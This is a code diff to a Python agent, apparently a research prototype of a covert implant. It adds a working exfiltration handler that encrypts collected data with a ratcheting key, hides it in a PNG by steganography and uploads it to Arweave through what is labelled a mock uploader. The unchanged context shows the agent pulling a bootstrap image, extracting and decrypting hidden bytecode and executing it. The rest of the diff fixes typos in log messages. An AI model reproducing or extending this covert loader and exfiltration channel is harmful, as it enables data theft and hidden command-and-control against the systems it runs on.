@@ -135,12 +135,55 @@ def run_agent(args):
 
     #Guard against unsupported watch mode
     if args.bootstrap_url is None:
-        logger.info("Watch mode not yet implemented")
         return -1
 
     #Exfiltration handler closure with access to agent keys and state
     def exfil_handler(vm, data):
-        return -1
+        # advance for next exfil in same VM run
+        nonlocal K_exfil_ratchet  
+        
+        #Check for a saved cover image
+        logger.info("Exfil handler start")
+
+        logger.info("Exfil handler step A, cover image checking start")
+        cover_path = shared_state.get("cover_path")
+
+        if cover_path is None:
+            logger.info("Exfil handler step A, cover image checking failed")
+            return -1
+        else:
+            logger.info("Exfil handler step A, cover image checking succeeded")
+            logger.info("Exfil handler step A, cover image checking finished")
+        
+        #Encrypt the exfil data
+        logger.info("Exfil handler step B, exfil data encryption start")
+        exfil_payload, new_exfil_ratchet = encrypt_task(data, K_exfil_ratchet)
+
+        #advance for next exfil in same VM run
+        K_exfil_ratchet = new_exfil_ratchet 
+
+        logger.info("Exfil handler step B, exfil data encryption finished")
+
+        #embed the encrypted payload into the cover image
+        logger.info("Exfil handler step B, exfil data embedding start")
+        stego_image = embed(cover_path, exfil_payload, K_extract)
+
+        stego_dir = "src/temp"
+        os.makedirs(stego_dir, exist_ok=True)
+        exfil_stego_path = os.path.join(stego_dir, "exfil.png")
+        stego_image.save(exfil_stego_path)
+
+        logger.info(f"Exfil handler step B, exfil image saved to {exfil_stego_path}")
+        logger.info("Exfil handler step B, exfil data embedding finished")
+
+        #Upload exfil data via arweave
+        logger.info("Exfil handler step C, exfil data uploading start")
+        txid = shared_state["mock"].upload_image("agent_wallet", exfil_stego_path)
+        logger.info("Exfil handler step C, exfil data uploading finished")
+
+        #Update shared state
+        shared_state["new_exfil_ratchet"] = new_exfil_ratchet
+        return txid
 
     #Download the bootstrap image
     logger.info("Step A, Bootstrap image download start")
@@ -163,11 +206,11 @@ def run_agent(args):
     stego_path = os.path.join(stego_dir, "stego.png")
     stego_image.save(stego_path)
 
-    logger.info(f"Step B, Bootstap image saved to {stego_path}")
+    logger.info(f"Step B, Bootstrap image saved to {stego_path}")
 
     #Extract the payload from the bootstrap image
     payload = extract(stego_path, K_extract)
-    logger.info("Step B, Bootstap image payload extracted")
+    logger.info("Step B, Bootstrap image payload extracted")
     logger.info(f"Step B, Payload length {len(payload)}")
     logger.info("Step B, Bootstrap image stego extraction finished")
 
@@ -181,7 +224,7 @@ def run_agent(args):
         return -1
     
     bytecode, agent_new_ratchet = payload_result
-    logger.info("Step C, Payload decryption succesful")
+    logger.info("Step C, Payload decryption successful")
     logger.info("Step C, Payload decryption finished")
 
     #Execute the bytecode 
